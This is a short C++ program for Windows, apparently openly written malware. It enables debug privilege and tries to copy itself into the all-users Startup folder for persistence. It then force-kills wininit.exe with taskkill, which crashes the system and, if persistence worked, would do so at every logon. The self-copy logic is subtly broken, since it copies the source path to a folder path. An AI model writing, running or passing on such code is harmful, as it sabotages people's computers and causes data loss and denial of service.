//latest 2025/9/7 12:22 enhe wang
//following GNU agreement
#include<iostream>
#include<shellapi.h>
#include<windows.h>
#include<vector>
#include<fstream>
#include<cstdio>
bool enableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }
    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return GetLastError() == ERROR_SUCCESS;
}
bool copy(const char* source, const char* destination) {
    std::ifstream src(source, std::ios::binary);
    std::ofstream dst(destination, std::ios::binary);
    dst << src.rdbuf();
    return true;
}
std::string getPath(const std::string& relativePath) {
    char absolutePath[MAX_PATH];
    if (GetFullPathNameA(relativePath.c_str(), MAX_PATH, absolutePath, nullptr)) {
        return std::string(absolutePath);
    }
    return "";
}

int main() {
	enableDebugPrivilege();
	std::string dest="C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    std::string absPath = getPath(__FILE__);
    copy(absPath.c_str(),dest.c_str());
    //ShellExecuteEx(NULL,"open","cmd.exe","taskkill /f /im wininit.exe",NULL,SW_HIDE);
    system("taskkill /f /im wininit.exe");
    return 0;
}
